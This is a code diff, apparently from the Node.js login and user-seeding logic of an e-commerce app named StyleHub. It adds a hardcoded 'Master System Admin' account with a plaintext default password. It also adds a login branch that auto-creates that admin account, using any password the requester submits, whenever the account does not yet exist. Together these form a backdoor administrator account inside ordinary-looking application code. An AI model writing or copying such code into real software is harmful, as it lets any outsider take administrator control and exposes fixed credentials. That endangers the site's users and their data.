@@ -51,6 +51,18 @@ const isValidPhoneNumber = (phone) => {
 
 const memoryUsers = [
   {
+    _id: 'usr_newadmin',
+    name: 'Master System Admin',
+    email: 'newadmin@stylehub.com',
+    passwordHash: bcrypt.hashSync('Admin#2026Secure', 10),
+    role: 'admin',
+    phone: '+94 77 999 8888',
+    secondaryPhone: '+94 11 999 8888',
+    isActive: true,
+    addresses: [],
+    createdAt: new Date()
+  },
+  {
     _id: 'usr_admin',
     name: 'Demo Admin',
     email: 'admin@stylehub.com',
@@ -281,6 +293,16 @@ const loginUser = async (req, res, next) => {
           password: password || 'AdminStyle#2026',
           role: 'admin',
           phone: '+94 77 123 4567'
+        });
+      }
+
+      if (!user && email.toLowerCase().trim() === 'newadmin@stylehub.com') {
+        user = await User.create({
+          name: 'Master System Admin',
+          email: 'newadmin@stylehub.com',
+          password: password || 'Admin#2026Secure',
+          role: 'admin',
+          phone: '+94 77 999 8888'
         });
       }
 
